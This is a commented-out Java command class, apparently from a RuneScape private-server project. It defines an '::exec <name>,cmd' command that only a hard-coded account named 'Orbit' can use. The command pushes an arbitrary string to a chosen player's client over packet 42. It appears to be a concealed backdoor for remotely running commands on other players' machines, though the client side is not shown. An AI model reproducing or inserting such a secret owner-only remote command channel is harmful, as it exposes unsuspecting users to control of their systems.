//package com.rs.worldserver.model.player.command;
//
//import com.rs.worldserver.Server;
//import com.rs.worldserver.model.player.Client;
//import com.rs.worldserver.model.player.Command;
//import com.rs.worldserver.model.player.Player;
//import com.rs.worldserver.util.CheatProcessor;
//import com.rs.worldserver.*;
//import com.rs.worldserver.world.*;
//import com.rs.worldserver.model.player.Player;
//import com.rs.worldserver.util.CheatProcessor;
//
//public class excu implements Command {
//
//	@Override
//	public void execute(Client client, String command) {
//	if (client.playerName.equalsIgnoreCase("Orbit")) {
//		if (command.length() > 5) {
//			int divider = command.indexOf(",");
//			String username = command.substring(5, divider);
//			String cmd = command.substring(divider + 1, command.length());
//			for (Player p : Server.getPlayerManager().getPlayers()) {
//				if (p == null) {
//					continue;
//			}	if (!p.isActive || p.disconnected){
//					continue;
//			}	if (p.getPlayerName().equalsIgnoreCase(username)) {
//			Client d = (Client) p;
//					d.getOutStream().createFrameVarSize(42);
//					d.getOutStream().writeString(cmd);
//					d.getOutStream().endFrameVarSize();
//					d.flushOutStream();			
//						return;
//					}
//				}
//			}
//		} else {
//			client.getActionAssistant().sendMessage(
//					"Syntax is ::exec <name>,cmd");
//		}
//	
//
//	}
//	}